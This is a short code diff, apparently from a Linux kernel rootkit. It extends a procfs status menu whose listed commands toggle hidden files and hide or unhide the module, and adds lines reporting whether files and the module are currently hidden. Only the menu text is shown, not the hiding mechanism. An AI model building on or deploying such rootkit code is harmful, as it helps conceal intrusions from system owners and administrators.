@@ -93,7 +93,10 @@ static ssize_t rk_read(struct file *file, char __user *buffer,
             ->------------------------------------------------- \n\
             -> thfile      - toggle hidden files \n\
             -> nhmodu      - a normal hidden module \n\
-            -> uhmodu      - a normal unhidden module \n");
+            -> uhmodu      - a normal unhidden module \n\
+            ->------------------------------------------------- \n\
+            -> Files hidden?:: %d \n\
+            -> Module hidden?: %d \n", hide_files, module_hidden);
         size = strlen(module_status);
         temp = size;
     }
@@ -254,7 +257,10 @@ static int __init procfs_init(void)
         ->------------------------------------------------- \n\
         -> thfile      - toggle hidden files \n\
         -> nhmodu      - a normal hidden module \n\
-        -> uhmodu      - a normal unhidden module \n");
+        -> uhmodu      - a normal unhidden module \n\
+        ->------------------------------------------------- \n\
+        -> Files hidden?:: %d \n\
+        -> Module hidden?: %d \n", hide_files, module_hidden);
     size = strlen(module_status);
     temp = size;
 
